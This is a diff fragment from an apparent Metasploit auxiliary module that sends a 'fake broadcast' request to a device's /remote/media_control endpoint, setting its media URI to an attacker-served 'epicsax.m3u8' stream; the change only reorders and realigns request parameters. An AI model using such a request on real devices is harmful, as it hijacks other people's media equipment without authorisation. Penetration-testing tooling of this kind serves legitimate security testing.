@@ -36,13 +36,13 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Sending fake broadcast to #{peer}")
     res = send_request_cgi(
-      'method' => 'GET',
-      'uri'    => '/remote/media_control',
-      'vars_get' => {
-        'action' => 'setUri',
-        'uri'    => get_uri + 'epicsax.m3u8'
-      },
-      'encode_params' => false
+      'method'        => 'GET',
+      'uri'           => '/remote/media_control',
+      'encode_params' => false,
+      'vars_get'      => {
+        'action'      => 'setUri',
+        'uri'         => get_uri + 'epicsax.m3u8'
+      }
     )
 
     unless res && res.code == 200
